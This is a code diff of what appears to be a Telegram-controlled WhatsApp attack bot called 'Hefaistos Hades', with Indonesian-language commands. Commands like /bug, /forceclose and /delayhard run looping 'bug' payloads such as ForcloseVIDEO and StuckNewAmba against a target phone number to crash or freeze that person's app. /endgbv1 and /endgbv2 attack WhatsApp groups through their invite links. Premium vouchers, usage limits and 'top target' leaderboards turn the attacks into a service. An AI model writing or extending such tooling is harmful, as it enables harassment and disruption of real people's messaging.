+// =====================================================
+bot.command("mypremium", async (ctx) => {
+  if (!isPremiumUser(ctx.from.id)) return ctx.reply("💤 Bukan premium. Pakai /redeem KODE.");
+  ctx.reply(`👑 <b>PREMIUM</b>\n\n📅 Expired: <b>${getPremExpired(ctx.from.id)}</b>\n⏳ Sisa: <b>${sisaHariPremium(ctx.from.id)} hari</b>`, { parse_mode: "HTML" });
+});
+bot.command("myjob", async (ctx) => {
+  const userId = ctx.from.id.toString();
+  const jobs = [...activeSpam.entries()].filter(([, s]) => s.userId === userId);
+  if (!jobs.length) return ctx.reply("📌 Gak ada job aktif.");
+  const lines = jobs.map(([jobId, s]) => {
+    const durasi = Math.floor((Date.now() - s.startAt) / 1000);
+    return `🆔 <code>${jobId}</code>\n🎯 ${s.target.split("@")[0]}\n⚙️ ${s.label}\n🔄 ${s.iterasi} | ✅ ${s.stats.ok} ❌ ${s.stats.fail}\n⏱ ${durasi}s`;
+  }).join("\n\n");
+  ctx.reply(`📊 <b>JOB AKTIF</b>\n\n${lines}`, { parse_mode: "HTML" });
+});
+bot.command("limit", async (ctx) => {
+  if (isPremiumUser(ctx.from.id)) return ctx.reply("👑 Premium — unlimited!");
+  const u = getUserLimit(ctx.from.id);
+  const sisa = Math.max(0, u.max - u.used);
+  const bar = "█".repeat(u.used) + "░".repeat(Math.max(0, u.max - u.used));
+  ctx.reply(`📊 <b>LIMIT</b>\n\n[${bar}]\n✅ Terpakai: <b>${u.used}</b>\n🟢 Sisa: <b>${sisa}</b>`, { parse_mode: "HTML" });
+});
+bot.command("daily", async (ctx) => {
+  const ok = checkDaily(ctx.from.id);
+  if (!ok) return ctx.reply("📌 Udah klaim hari ini.");
+  givePointDaily(ctx.from);
+  addCoin(ctx.from.id, 5);
+  ctx.reply("🎁 <b>DAILY CLAIM</b>\n\n✅ +5 Point\n✅ +5 Coin", { parse_mode: "HTML" });
+});
+bot.command("redeem", async (ctx) => {
+  const code = ctx.message.text.split(" ")[1];
+  if (!code) return ctx.reply("📌 Format: /redeem KODE-VOUCHER");
+  const res = redeemVoucher(code.toUpperCase(), ctx.from.id);
+  if (!res.ok) return ctx.reply(`❌ ${res.msg}`);
+  ctx.reply(`🎉 <b>VOUCHER BERHASIL!</b>\n\n⭐ +${res.days} hari premium\n📅 Expired: <b>${res.exp}</b>`, { parse_mode: "HTML" });
+});
+bot.command("myreferral", async (ctx) => {
+  const code = getMyRefCode(ctx.from.id);
+  const refs = getReferral(ctx.from.id);
+  const botInfo = await bot.telegram.getMe().catch(() => null);
+  const link = botInfo ? `https://t.me/${botInfo.username}?start=${code}` : "-";
+  ctx.reply(`🔗 <b>REFERRAL</b>\n\n📌 <code>${code}</code>\n🔗 ${link}\n👥 Total: <b>${refs.length}</b>`, { parse_mode: "HTML" });
+});
+bot.command("coin", async (ctx) => {
+  ctx.reply(`🪙 <b>COIN</b>\n\n💰 <b>${getCoin(ctx.from.id)}</b>`, { parse_mode: "HTML" });
+});
+bot.command("ping", async (ctx) => {
+  const t1 = Date.now();
+  const m = await ctx.reply("🏓 Pinging...");
+  const t2 = Date.now();
+  ctx.telegram.editMessageText(ctx.chat.id, m.message_id, undefined, `🏓 <b>Pong!</b> ${t2 - t1}ms | <b>${isWhatsAppConnected ? "Online" : "Offline"}</b>`, { parse_mode: "HTML" });
+});
+bot.command("saran", async (ctx) => {
+  const text = ctx.message.text.split(" ").slice(1).join(" ").trim();
+  if (!text) return ctx.reply("📌 Format: /saran pesan...");
+  const user = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User";
+  bot.telegram.sendMessage(ownerID, `💡 <b>SARAN</b>\n\n👤 ${esc(user)} (<code>${ctx.from.id}</code>)\n\n${esc(text)}`, { parse_mode: "HTML" }).catch(() => {});
+  ctx.reply("✅ Saran dikirim ke owner.");
+});
+bot.command("report", async (ctx) => {
+  const text = ctx.message.text.split(" ").slice(1).join(" ").trim();
+  if (!text) return ctx.reply("📌 Format: /report alasan...");
+  const user = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User";
+  bot.telegram.sendMessage(ownerID, `🚨 <b>REPORT</b>\n\n👤 ${esc(user)} (<code>${ctx.from.id}</code>)\n\n${esc(text)}`, { parse_mode: "HTML" }).catch(() => {});
+  ctx.reply("✅ Laporan dikirim ke owner.");
+});
+bot.command("help", async (ctx) => {
+  const html = `
+<h1>📖 Help</h1>
+<hr/>
+<h2>🐛 Bug</h2>
+<p>/bug, /delayhard, /ghost, /forceclose, /forcezz, /xdios, /stopbug</p>
+<h2>🔥 Ban</h2>
+<p>/endgbv1, /endgbv2</p>
+<h2>👤 Member</h2>
+<p>/mypremium /myjob /limit /daily /redeem /myreferral /coin /ping /saran /report</p>
+<h2>👥 Grup</h2>
+<p>/ginfo /gadmin /gmember /ginvite /glock /gunlock /gkick</p>
+`.trim();
+  try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html } }); }
+  catch { await ctx.reply("📖 Ketik /help", { parse_mode: "Markdown" }); }
+});
+
+// =====================================================
+// ============ ADMIN COMMANDS =========================
+// =====================================================
+bot.command("broadcast", async (ctx) => {
+  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
+  const text = ctx.message.text.split(" ").slice(1).join(" ").trim();
+  if (!text) return ctx.reply("📌 /broadcast pesan...");
+  const users = getAllUsers();
+  const uids = Object.keys(users);
+  let ok = 0, fail = 0;
+  const m = await ctx.reply(`📢 Broadcasting ke ${uids.length} user...`);
+  for (const uid of uids) {
+    try { await bot.telegram.sendMessage(uid, `📢 <b>BROADCAST</b>\n\n${esc(text)}`, { parse_mode: "HTML" }); ok++; }
+    catch { fail++; }
+    await sleep(50);
+  }
+  ctx.telegram.editMessageText(ctx.chat.id, m.message_id, undefined, `✅ Selesai. OK: ${ok}, Fail: ${fail}`);
+});
+bot.command("ban", async (ctx) => {
+  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
+  const args = ctx.message.text.split(" ").slice(1);
+  const target = ctx.message.reply_to_message ? ctx.message.reply_to_message.from.id : args[0];
+  if (!target) return ctx.reply("📌 /ban 12345678 atau reply user");
+  banUser(target, args[1] || "-");
+  ctx.reply(`✅ <code>${target}</code> dibanned.`, { parse_mode: "HTML" });
+});
+bot.command("unban", async (ctx) => {
+  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
+  const args = ctx.message.text.split(" ").slice(1);
+  const target = ctx.message.reply_to_message ? ctx.message.reply_to_message.from.id : args[0];
+  if (!target) return ctx.reply("📌 /unban 12345678 atau reply user");
+  unbanUser(target);
+  ctx.reply(`✅ <code>${target}</code> di-unban.`, { parse_mode: "HTML" });
+});
+bot.command("listuser", async (ctx) => {
+  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
+  const users = Object.values(getAllUsers());
+  if (!users.length) return ctx.reply("📭 Belum ada user.");
+  const top = users.slice(0, 30).map((u, i) => `${i + 1}. ${esc(u.name || "User")} — ${u.premium ? "Premium" : "Free"}`).join("\n");
+  ctx.reply(`👥 <b>USER</b> (${users.length})\n\n${top}`, { parse_mode: "HTML" });
+});
+bot.command("listban", async (ctx) => {
+  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
+  const b = Object.entries(getAllBanned());
+  if (!b.length) return ctx.reply("📭 Gak ada banned.");
+  const txt = b.map(([id, v], i) => `${i + 1}. <code>${id}</code> — ${esc(v.reason || "-")}`).join("\n");
+  ctx.reply(`🚫 <b>BANNED</b>\n\n${txt}`, { parse_mode: "HTML" });
+});
+bot.command("setlimit", async (ctx) => {
+  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
+  const args = ctx.message.text.split(" ").slice(1);
+  if (args.length < 2) return ctx.reply("📌 /setlimit 12345678 10");
+  setUserLimit(args[0], parseInt(args[1]));
+  ctx.reply(`✅ Limit <code>${args[0]}</code> diset ke ${args[1]}.`, { parse_mode: "HTML" });
+});
+bot.command("resetlimit", async (ctx) => {
+  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
+  resetAllLimit();
+  ctx.reply("✅ Semua limit di-reset.");
+});
+bot.command("whitelist", async (ctx) => {
+  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
+  const args = ctx.message.text.split(" ").slice(1);
+  const sub = args[0];
+  if (sub === "add") {
+    if (!args[1]) return ctx.reply("📌 /whitelist add 628xxxx");
+    addWhitelist(args[1]);
+    ctx.reply(`✅ <code>${args[1]}</code> ditambah.`, { parse_mode: "HTML" });
+  } else if (sub === "del") {
+    if (!args[1]) return ctx.reply("📌 /whitelist del 628xxxx");
+    delWhitelist(args[1]);
+    ctx.reply(`🗑 <code>${args[1]}</code> dihapus.`, { parse_mode: "HTML" });
+  } else if (sub === "list") {
+    const w = loadWhitelist();
+    if (!w.list.length) return ctx.reply("📭 Whitelist kosong.");
+    ctx.reply(`🛡 <b>WHITELIST</b>\n\n${w.list.map((n, i) => `${i + 1}. <code>${n}</code>`).join("\n")}`, { parse_mode: "HTML" });
+  } else {
+    ctx.reply("📌 /whitelist add|del|list");
+  }
+});
+bot.command("maintenance", async (ctx) => {
+  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
+  const arg = (ctx.message.text.split(" ")[1] || "").toLowerCase();
+  if (arg === "on") { maintenanceMode = true; saveSettings({ ...getSettings(), maintenance: true }); ctx.reply("🔧 Maintenance ON"); }
+  else if (arg === "off") { maintenanceMode = false; saveSettings({ ...getSettings(), maintenance: false }); ctx.reply("✅ Maintenance OFF"); }
+  else ctx.reply("📌 /maintenance on|off");
+});
+bot.command("autobackup", async (ctx) => {
+  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
+  const arg = (ctx.message.text.split(" ")[1] || "").toLowerCase();
+  if (arg === "on") {
+    autobackupEnabled = true; saveSettings({ ...getSettings(), autobackup: true });
+    if (autobackupInterval) clearInterval(autobackupInterval);
+    autobackupInterval = setInterval(async () => {
+      try {
+        const files = fs.readdirSync("./database").filter(f => f.endsWith(".json"));
+        for (const f of files) await bot.telegram.sendDocument(ownerID, { source: `./database/${f}`, filename: f }).catch(() => {});
+        await bot.telegram.sendMessage(ownerID, `📦 Autobackup: ${files.length} file`);
+      } catch {}
+    }, 6 * 60 * 60 * 1000);
+    ctx.reply("✅ Autobackup ON (tiap 6 jam).");
+  } else if (arg === "off") {
+    autobackupEnabled = false; saveSettings({ ...getSettings(), autobackup: false });
+    if (autobackupInterval) { clearInterval(autobackupInterval); autobackupInterval = null; }
+    ctx.reply("🛑 Autobackup OFF.");
+  } else ctx.reply("📌 /autobackup on|off");
+});
+bot.command("logs", async (ctx) => {
+  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
+  const logs = getLogs(20);
+  if (!logs.length) return ctx.reply("📭 Belum ada log.");
+  const txt = logs.map((l, i) => `${i + 1}. [${l.type}] ${esc(l.msg)} — <i>${l.at}</i>`).join("\n");
+  ctx.reply(`📜 <b>LOGS</b>\n\n${txt}`, { parse_mode: "HTML" });
+});
+bot.command("restart", async (ctx) => {
+  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
+  await ctx.reply("🔄 Restarting...");
+  setTimeout(() => process.exit(0), 1500);
+});
+bot.command("clearsession", async (ctx) => {
+  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
+  try {
+    if (fs.existsSync("./session")) fs.rmSync("./session", { recursive: true, force: true });
+    ctx.reply("✅ Session WA dihapus. Restart bot buat re-pairing.");
+  } catch (e) { ctx.reply(`❌ ${e.message}`); }
+});
+bot.command("voucher", async (ctx) => {
+  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
+  const args = ctx.message.text.split(" ").slice(1);
+  const sub = args[0];
+  if (sub === "create") {
+    const days = parseInt(args[1]); const count = parseInt(args[2]);
+    if (!days || !count) return ctx.reply("📌 /voucher create <hari> <jumlah>");
+    const codes = createVoucher(days, count);
+    ctx.reply(`✅ Voucher:\n\n${codes.map(c => `<code>${c}</code>`).join("\n")}`, { parse_mode: "HTML" });
+  } else if (sub === "list") {
+    const list = listVoucher();
+    if (!list.length) return ctx.reply("📭 Belum ada voucher.");
+    const txt = list.slice(0, 30).map((v, i) => `${i + 1}. <code>${v.code}</code> — ${v.days}h ${v.used ? "USED" : "READY"}`).join("\n");
+    ctx.reply(`🎫 <b>VOUCHER</b>\n\n${txt}`, { parse_mode: "HTML" });
+  } else ctx.reply("📌 /voucher create|list");
+});
+bot.command("addcoin", async (ctx) => {
+  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
+  const args = ctx.message.text.split(" ").slice(1);
+  if (args.length < 2) return ctx.reply("📌 /addcoin 12345678 100");
+  addCoin(args[0], parseInt(args[1]));
+  ctx.reply(`✅ ${args[1]} coin dikirim ke <code>${args[0]}</code>`, { parse_mode: "HTML" });
+});
+
+// =====================================================
+// ============ INFO TAMBAHAN ==========================
+// =====================================================
+bot.command("uptime", async (ctx) => {
+  const start = moment(botStartTime).tz("Asia/Jakarta").format("DD-MM-YYYY HH:mm:ss");
+  ctx.reply(`⏱ <b>UPTIME</b>\n\n🟢 Aktif: <code>${formatUptimePretty()}</code>\n📅 Start: <code>${start} WIB</code>`, { parse_mode: "HTML" });
+});
+bot.command("sysinfo", async (ctx) => {
+  const mem = process.memoryUsage();
+  const cpu = process.cpuUsage();
+  ctx.reply(`🖥 <b>SYSINFO</b>\n\n💾 RAM: <code>${(mem.rss / 1024 / 1024).toFixed(0)} MB</code>\n🧠 Heap: <code>${(mem.heapUsed / 1024 / 1024).toFixed(0)} MB</code>\n🔧 CPU: <code>${(cpu.user / 1000).toFixed(0)} ms</code>\n📦 Node: <code>${process.version}</code>\n⏱ Uptime: <code>${formatUptimePretty()}</code>`, { parse_mode: "HTML" });
+});
+bot.command("statscmd", async (ctx) => {
+  const stats = getStatCmd().slice(0, 15);
+  if (!stats.length) return ctx.reply("📭 Belum ada data.");
+  const txt = stats.map((s, i) => `${i + 1}. <code>/${s.c}</code> — ${s.n}x`).join("\n");
+  ctx.reply(`📊 <b>STATS CMD</b>\n\n${txt}`, { parse_mode: "HTML" });
+});
+bot.command("statstarget", async (ctx) => {
+  const s = loadStats();
+  const top = Object.entries(s.per_target || {}).map(([no, c]) => ({ no, c })).sort((a, b) => b.c - a.c).slice(0, 10);
+  if (!top.length) return ctx.reply("📭 Belum ada data.");
+  const txt = top.map((t, i) => `${i + 1}. <code>${t.no}</code> — ${t.c}x`).join("\n");
+  ctx.reply(`🎯 <b>TOP TARGET</b>\n\n${txt}`, { parse_mode: "HTML" });
+});
+bot.command("topuser", async (ctx) => {
+  const s = loadStats();
+  const top = Object.entries(s.per_user || {}).map(([id, v]) => ({ id, ...v }))
+    .sort((a, b) => (b.bug_count + b.ban_count) - (a.bug_count + a.ban_count)).slice(0, 10);
+  if (!top.length) return ctx.reply("📭 Belum ada data.");
+  const txt = top.map((u, i) => `${i + 1}. <b>${esc(u.name || "User")}</b> — 🐛${u.bug_count} 🔥${u.ban_count}`).join("\n");
+  ctx.reply(`🏆 <b>TOP USER</b>\n\n${txt}`, { parse_mode: "HTML" });
+});
+bot.command("topgrup", async (ctx) => {
+  const s = loadStats();
+  const top = Object.entries(s.per_group || {}).map(([id, c]) => ({ id, c })).sort((a, b) => b.c - a.c).slice(0, 10);
+  if (!top.length) return ctx.reply("📭 Belum ada data grup.");
+  const txt = top.map((g, i) => `${i + 1}. <code>${g.id}</code> — ${g.c}x`).join("\n");
+  ctx.reply(`🏆 <b>TOP GRUP</b>\n\n${txt}`, { parse_mode: "HTML" });
+});
+bot.command("stats", async (ctx) => {
+  const s = loadStats();
+  const day = todayWIB();
+  const today = s.per_day?.[day] || { bug: 0, ban: 0 };
+  const totalIter = (s.total_iterasi_ok || 0) + (s.total_iterasi_fail || 0);
+  const rate = totalIter > 0 ? ((s.total_iterasi_ok / totalIter) * 100).toFixed(1) : "0.0";
+  ctx.reply(`📊 <b>STATS</b>\n\n🔥 Hari ini (${day})\n🐛 ${today.bug} | 🔥 ${today.ban}\n\n📈 Total\nJob: ${s.total_jobs || 0}\nIter OK: ${s.total_iterasi_ok || 0}\nIter Fail: ${s.total_iterasi_fail || 0}\nRate: ${rate}%`, { parse_mode: "HTML" });
+});
+bot.command("info", checkWhatsAppConnection, async (ctx) => {
+  const html = `
+<h1>🛰️ Info Sender</h1>
+<hr/>
+<table>
+  <tr><th>Komponen</th><th>Nilai</th></tr>
+  <tr><td>Status WA</td><td><b>${isWhatsAppConnected ? "Online" : "Offline"}</b></td></tr>
+  <tr><td>Uptime</td><td><code>${formatRuntime()}</code></td></tr>
+  <tr><td>Memory</td><td><code>${formatMemory()}</code></td></tr>
+  <tr><td>Node</td><td><code>${process.version}</code></td></tr>
+  <tr><td>Nomor</td><td><code>${sock?.user?.id?.split(":")[0] || "-"}</code></td></tr>
+</table>
+`.trim();
+  try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html } }); }
+  catch { await ctx.reply(`🛰 Status: ${isWhatsAppConnected ? "Online" : "Offline"}\nUptime: ${formatRuntime()}`, { parse_mode: "Markdown" }); }
+});
+bot.command("topbug", async (ctx) => {
+  const s = loadStats();
+  const top = Object.entries(s.per_target || {}).map(([no, c]) => ({ no, c })).sort((a, b) => b.c - a.c).slice(0, 10);
+  if (!top.length) return ctx.reply("📭 Belum ada data.");
+  const rows = top.map((t, i) => `${i + 1}. <code>${esc(t.no)}</code> — ${t.c}x`).join("\n");
+  ctx.reply(`🎯 <b>TOP 10 TARGET</b>\n\n${rows}`, { parse_mode: "HTML" });
+});
+
+// =====================================================
+// ============ BUG COMMAND ============================
+// =====================================================
+function manualBugCommand(cmd, bugKey, label) {
+  bot.command(cmd, premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
+    const userId = ctx.from.id.toString();
+    if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus premium.");
+    const args = ctx.message.text.split(" ");
+    if (!args[1]) return ctx.reply(`📌 Format: /${cmd} 628xxxx`);
+    const target = formatTarget(args[1]);
+    if (!target) return ctx.reply("❌ Nomor tidak valid.");
+    if (isWhitelisted(args[1])) return ctx.reply("🛡 Target ada di whitelist.");
+    if (!isPremiumUser(userId)) {
+      if (!canUse(userId)) { const u = getUserLimit(userId); return ctx.reply(`⏳ Limit harian habis (${u.used}/${u.max}).`); }
+      addUse(userId);
+    }
+    const tasks = getBugTasks(bugKey, target);
+    spamForever(ctx, label, target, tasks);
+  });
+}
+manualBugCommand("delayhard",  "delayhard",  "Delayhard");
+manualBugCommand("ghost",      "ghost",      "Ghost");
+manualBugCommand("forceclose", "forceclose", "Forceclose");
+manualBugCommand("forcezz",    "forcezz",    "Forcezz");
+manualBugCommand("xdios",      "xdios",      "Xdios");
+
 function getBugTasks(bugName, target) {
   switch (bugName) {
     case "forceclose":
@@ -1562,84 +2069,20 @@ function getBugTasks(bugName, target) {
   }
 }
 
-// =====================================================
-// ============ COMMAND MANUAL BUG =====================
-// =====================================================
-function manualBugCommand(cmd, bugKey, label) {
-  bot.command(cmd, premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
-    const userId = ctx.from.id.toString();
-    if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus premium.");
-    const args = ctx.message.text.split(" ");
-    if (!args[1]) return ctx.reply(`📌 Format: /${cmd} 628xxxx`);
-    const target = formatTarget(args[1]);
-    if (!target) return ctx.reply("❌ Nomor tidak valid.");
-    if (isWhitelisted(args[1])) return ctx.reply("🛡 Target ada di whitelist.");
-    if (!isPremiumUser(userId)) {
-      if (!canUse(userId)) {
-        const u = getUserLimit(userId);
-        return ctx.reply(`⏳ Limit harian habis (${u.used}/${u.max}).`);
-      }
-      addUse(userId);
-    }
-    const tasks = getBugTasks(bugKey, target);
-    spamForever(ctx, label, target, tasks);
-  });
-}
-manualBugCommand("delayhard",  "delayhard",  "Delayhard");
-manualBugCommand("ghost",      "ghost",      "Ghost");
-manualBugCommand("forceclose", "forceclose", "Forceclose");
-manualBugCommand("forcezz",    "forcezz",    "Forcezz");
-manualBugCommand("xdios",      "xdios",      "Xdios");
-
-// =====================================================
-// ============ /endgbv1 & v2 (manual) =================
-// =====================================================
-function banManual(cmd, banKey, label) {
-  bot.command(cmd, premGroupOnly(), async (ctx) => {
-    const userId = ctx.from.id.toString();
-    if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus premium.");
-    if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
-    const targetInput = ctx.message.text.split(" ").slice(1).join(" ").trim();
-    if (!targetInput) return ctx.reply(`📌 Format: /${cmd} https://chat.whatsapp.com/xxxxx`);
-    if (!targetInput.includes("chat.whatsapp.com/")) return ctx.reply("❌ Link gak valid.");
-    const inviteCode = String(targetInput.split("chat.whatsapp.com/")[1].split(/[?/]/)[0]);
-    try { logStatsBan(userId, ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User"); } catch {}
-    await ctx.reply("Succes Banned Group", {
-      reply_markup: { inline_keyboard: [[{ text: "Details Target", url: `https://chat.whatsapp.com/${inviteCode}`, icon_custom_emoji_id: "5395444784611480792", style: "success" }]] },
-    });
-    queue.add(async () => {
-      try {
-        if (banKey === "endgb") await proxzy(sock, inviteCode);
-        else if (banKey === "endgbv2") await BanGroup(sock, inviteCode);
-        await ctx.reply(`✅ ${label} selesai!`);
-      } catch (e) { await ctx.reply(`❌ Gagal: ${e.message}`); }
-    });
-  });
-}
-banManual("endgbv1", "endgb",   "End GB v1");
-banManual("endgbv2", "endgbv2", "End GB v2");
-
-// =====================================================
-// ============ CRASH BUG (/bug) =======================
-// =====================================================
 bot.command("bug", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply("🪧 Example : /bug 62xx");
   const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
   if (isWhitelisted(q)) return ctx.reply("🛡 Target ada di whitelist.");
   if (!isPremiumUser(ctx.from.id)) {
-    if (!canUse(ctx.from.id)) {
-      const u = getUserLimit(ctx.from.id);
-      return ctx.reply(`⏳ Limit harian habis (${u.used}/${u.max}).`);
-    }
+    if (!canUse(ctx.from.id)) { const u = getUserLimit(ctx.from.id); return ctx.reply(`⏳ Limit harian habis (${u.used}/${u.max}).`); }
     addUse(ctx.from.id);
   }
-
   await ctx.replyWithPhoto({ source: "./image/MagicClowerd.jpg" }, {
     caption: `<blockquote><pre>⬡═―—⊱ ⎧ HEFAISTOS HADES ⎭ ⊰―—═⬡\n⌑ Target : ${q}\n⌑ Status : Ready\n⌑ Silahkan Pilih bug di bawah...\n╘═——————————————═⬡</pre></blockquote>`,
     parse_mode: "HTML",
     reply_markup: { inline_keyboard: [
-      [{ text: "𝖣𝖾𝗅𝖺𝗒 𝖡𝗋𝗎𝗍𝖺𝗅𝗂𝗍𝗒", callback_data: `delay_${target}` }, { text: "Force Close", callback_data: `fc_${target}` }],
+      [{ text: "Delay Brutality", callback_data: `delay_${target}` }, { text: "Force Close", callback_data: `fc_${target}` }],
       [{ text: "XDioS", callback_data: `blank_${target}` }, { text: "Force Freez", callback_data: `bulldozer_${target}` }]
     ] }
   });
@@ -1659,8 +2102,6 @@ bot.on("callback_query", async (ctx) => {
     delay: { name: "Delay Brutality", tasks: [
       { name: "StuckNewAmba-1", fn: () => StuckNewAmba(sock, target) },
       { name: "StuckLogo-1",    fn: () => StuckLogo(sock, target)    },
-      { name: "StuckNewAmba-2", fn: () => StuckNewAmba(sock, target) },
-      { name: "StuckLogo-2",    fn: () => StuckLogo(sock, target)    },
     ]},
     blank: { name: "XDioS", tasks: [
       { name: "catchingOs", fn: () => catchingOs(target) },
@@ -1669,16 +2110,12 @@ bot.on("callback_query", async (ctx) => {
     bulldozer: { name: "Force Freez", tasks: [
       { name: "VIDEO-1", fn: () => ForcloseVIDEO(sock, target) },
       { name: "DOC-1", fn: () => ForcloseDOC(sock, target) },
-      { name: "StuckNewAmba-1", fn: () => StuckNewAmba(sock, target) },
-      { name: "StuckLogo-1", fn: () => StuckLogo(sock, target) },
       { name: "STC-1", fn: () => ForcloseSTC(sock, target) },
-      { name: "VIDEO-2", fn: () => ForcloseVIDEO(sock, target) },
     ]},
     fc: { name: "Force close", tasks: [
       { name: "VIDEO-1", fn: () => ForcloseVIDEO(sock, target) },
       { name: "DOC-1", fn: () => ForcloseDOC(sock, target) },
       { name: "STC-1", fn: () => ForcloseSTC(sock, target) },
-      { name: "VIDEO-2", fn: () => ForcloseVIDEO(sock, target) },
     ]},
   };
   const m = methods[key];
@@ -1687,491 +2124,6 @@ bot.on("callback_query", async (ctx) => {
   spamForever(ctx, m.name, target, m.tasks);
 });
 
-// =====================================================
-// ============ 👤 MEMBER FEATURES (1-10) ==============
-// =====================================================
-
-// 1. /mypremium
-bot.command("mypremium", async (ctx) => {
-  const userId = ctx.from.id;
-  const isPrem = isPremiumUser(userId);
-  if (!isPrem) return ctx.reply("💤 Kamu bukan user premium.\n\nBeli voucher /redeem buat jadi premium.");
-  const sisa = sisaHariPremium(userId);
-  const exp = getPremExpired(userId);
-  ctx.reply(`👑 <b>STATUS PREMIUM</b>\n\n⭐ Status : <b>Premium</b>\n📅 Expired : <b>${exp}</b>\n⏳ Sisa : <b>${sisa} hari</b>\n\n<i>Perpanjang sebelum expired biar gak putus.</i>`, { parse_mode: "HTML" });
-});
-
-// 2. /myjob
-bot.command("myjob", async (ctx) => {
-  const userId = ctx.from.id.toString();
-  const jobs = [...activeSpam.entries()].filter(([, s]) => s.userId === userId);
-  if (!jobs.length) return ctx.reply("📌 Lagi gak ada job aktif.");
-
-  const lines = jobs.map(([jobId, s]) => {
-    const durasi = Math.floor((Date.now() - s.startAt) / 1000);
-    return `🆔 <code>${jobId}</code>\n🎯 Target: <code>${s.target.split("@")[0]}</code>\n⚙️ Metode: <b>${s.label}</b>\n🔄 Iterasi: <b>${s.iterasi}</b>\n✅ OK: ${s.stats.ok} | ❌ Fail: ${s.stats.fail}\n⏱ ${durasi}s`;
-  }).join("\n\n");
-
-  ctx.reply(`📊 <b>JOB AKTIF KAMU</b> (${jobs.length})\n\n${lines}`, { parse_mode: "HTML" });
-});
-
-// 3. /limit
-bot.command("limit", async (ctx) => {
-  const userId = ctx.from.id;
-  if (isPremiumUser(userId)) {
-    return ctx.reply("👑 Kamu <b>Premium</b> — limit unlimited! 🎉", { parse_mode: "HTML" });
-  }
-  const u = getUserLimit(userId);
-  const sisa = Math.max(0, u.max - u.used);
-  const bar = "█".repeat(u.used) + "░".repeat(Math.max(0, u.max - u.used));
-  ctx.reply(`📊 <b>LIMIT HARIAN</b>\n\n[${bar}]\n✅ Terpakai: <b>${u.used}</b>\n🟢 Sisa: <b>${sisa}</b>\n📅 Reset: <b>00:00 WIB</b>`, { parse_mode: "HTML" });
-});
-
-// 4. /daily
-bot.command("daily", async (ctx) => {
-  const userId = ctx.from.id;
-  const ok = checkDaily(userId);
-  if (!ok) return ctx.reply("📌 Kamu udah klaim daily hari ini. Balik lagi besok ya!");
-  givePointDaily(ctx.from);
-  addCoin(userId, 5);
-  ctx.reply("🎁 <b>DAILY CLAIM</b>\n\n✅ +5 Point\n✅ +5 Coin\n\nBalik lagi besok buat klaim lagi!", { parse_mode: "HTML" });
-});
-
-// 5. /redeem
-bot.command("redeem", async (ctx) => {
-  const code = ctx.message.text.split(" ")[1];
-  if (!code) return ctx.reply("📌 Format: /redeem KODE-VOUCHER");
-  const res = redeemVoucher(code.toUpperCase(), ctx.from.id);
-  if (!res.ok) return ctx.reply(`❌ ${res.msg}`);
-  ctx.reply(`🎉 <b>VOUCHER BERHASIL!</b>\n\n⭐ Kamu dapat <b>${res.days} hari</b> premium.\n📅 Expired: <b>${res.exp}</b>`, { parse_mode: "HTML" });
-});
-
-// 6. /myreferral
-bot.command("myreferral", async (ctx) => {
-  const userId = ctx.from.id;
-  const code = getMyRefCode(userId);
-  const refs = getReferral(userId);
-  const botInfo = await bot.telegram.getMe().catch(() => null);
-  const link = botInfo ? `https://t.me/${botInfo.username}?start=${code}` : `t.me/...?start=${code}`;
-  ctx.reply(`🔗 <b>REFERRAL KAMU</b>\n\n📌 Kode: <code>${code}</code>\n🔗 Link: ${link}\n\n👥 Total refer: <b>${refs.length}</b>\n\n<i>Setiap orang yang join via kode kamu = bonus!</i>`, { parse_mode: "HTML" });
-});
-
-// 7. /help
-bot.command("help", async (ctx) => {
-  const html = `
-<h1>📖 Help — Hefaistos Hades</h1>
-<hr/>
-<h2>🐛 Bug</h2>
-<ul>
-  <li>/bug 62xxxx — Crash bug</li>
-  <li>/delayhard, /ghost, /forceclose, /forcezz, /xdios</li>
-  <li>/stopbug — Stop semua job</li>
-</ul>
-<h2>🔥 Ban Group</h2>
-<ul>
-  <li>/endgbv1 & /endgbv2 (link grup)</li>
-</ul>
-<h2>👤 Member</h2>
-<ul>
-  <li>/mypremium /myjob /limit /daily /redeem</li>
-  <li>/myreferral /ping /saran /report</li>
-</ul>
-<h2>📊 Info</h2>
-<ul>
-  <li>/stats /info /history /topbug</li>
-  <li>/uptime /sysinfo /statscmd</li>
-</ul>
-<h2>🎮 Game</h2>
-<ul>
-  <li>/ttt /suit /mypoint /leaderboard</li>
-</ul>
-`.trim();
-  try {
-    await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html } });
-  } catch {
-    await ctx.reply("📖 Ketik /help — daftar command ada di menu utama.", { parse_mode: "Markdown" });
